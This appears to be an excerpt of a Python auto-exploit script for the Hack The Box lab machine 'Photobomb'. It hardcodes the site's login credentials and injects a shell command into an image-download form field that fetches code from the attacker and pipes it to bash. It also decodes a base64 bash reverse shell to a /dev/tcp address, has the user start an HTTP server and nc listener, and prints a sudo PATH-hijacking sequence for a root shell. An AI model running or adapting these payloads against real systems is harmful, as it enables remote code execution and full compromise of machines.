...
def banner():
    ...
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Photobomb
    __________________________________________________________________________\n"""
...
target_machine="10.10.11.182" # change this if change ip on htb.
...
def default_cred_user():
    try:
        ...
        if machine_default_ip:
            ...
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Photobomb Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

url_download = "http://photobomb.htb/printer"
main_url = "http://photobomb.htb/"
auth = ('pH0t0', 'b0Mb!')
def wizar_user_exploit():
    s = requests.Session()
    
    login = s.get(main_url, auth=auth)
    print(f"[+] Acceso a la página principal: {login.status_code}")
    ...
    data = {
        'photo': 'finn-whelen-DTfhsDIWNSg-unsplash.jpg',
        'filetype': f'jpg;curl {machine_ip}|bash',
        'dimensions': '3000x2000'
    }

    response = s.post(url_download, headers=headers, data=data, auth=auth)
    print(f"[+] Petición enviada: {response.status_code}")
    print(response.text) 

def root_exploit():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Injection Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. cd /tmp\n2. touch [\n3. chmod +x [\n4. echo 'bash -p' > [\n5. sudo PATH=/tmp:$PATH /opt/cleanup.sh")                                
    ...
    try:
        ...
        while True:
            ...
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","wizar connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar] > " + Fore.YELLOW + f"(Exploit) http://{url_download}");cm.sleep(0.2)
                commands_send("echo 'IyEvYmluL2Jhc2gKCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOC80NDMgMD4mMQo=' | base64 -d > index.html")
                commands_send(f"sed -i 's/10.10.16.8/{machine_ip}/g' index.html")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar-user Command (Http-server)] > " + Fore.LIGHTMAGENTA_EX + f"sudo python3 -m http.server 80")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar-user Command (Http-server)] > " + Fore.LIGHTMAGENTA_EX + f"sudo nc -nlvp 443")                                
                input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [wizar-user] > " + Fore.WHITE + f"Press ENTER to continue...")
                wizar_user_exploit()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","root connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root] > " + Fore.YELLOW + f"Path Hijacking (Exploit [) http://{target_machine}");cm.sleep(0.2)
                root_exploit()
